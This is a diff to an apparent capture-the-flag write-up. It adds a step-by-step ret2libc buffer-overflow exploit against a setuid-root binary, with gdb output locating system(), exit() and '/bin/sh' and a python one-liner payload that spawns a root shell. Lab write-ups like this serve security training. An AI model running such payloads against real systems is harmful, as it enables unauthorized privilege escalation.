@@ -1734,18 +1734,50 @@ We can see that it runs into a segmentation fault if we give it too big of a str
 
 Because this is a security challenge we know that this segv is a buffer overflow and that we can exploit it.
 
-We need to know 
-
-Here, we can run a stack buffer overflow, because this file SEGVs when we send it more than 140 characters.
+By trying different lengths, we see that it SEGVs when we send it more than 140 characters.
 
 Because it's setuid bit is set to root, we will win if we can find a way to spawn a shell.
 
-We first need to find out how many bytes we need to send until our content overwrites `eip`. Then, we can do a return to libc exploit by adding the address of system to overwrite the one of exit and moving "/bin/sh" as an argument to it
+We will do a ret2libc exploit :
 
 ```
-zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("\x90" * 140 +  "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7"  + "\x58\xcc\xf8\xb7")')
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+```
+
+We need to find the addresses of `system()` and `exit()`, as well as one for `"/bin/sh"`
+
+```
+zaz@BornToSecHackMe:~$ gdb -q ./exploit_me
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:      "/bin/sh"
+(gdb)
+```
+
+So, system is at `0xb7e6b060`, exit is at `0xb7e5ebe0`, and /bin/sh at `0xb7f8cc58`.
+
+Our payload will be: padding + address of system + address of exit + address of /bin/sh
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
 #[......]
 # whoami
 root
 #
 ```
+
+End of writeup2
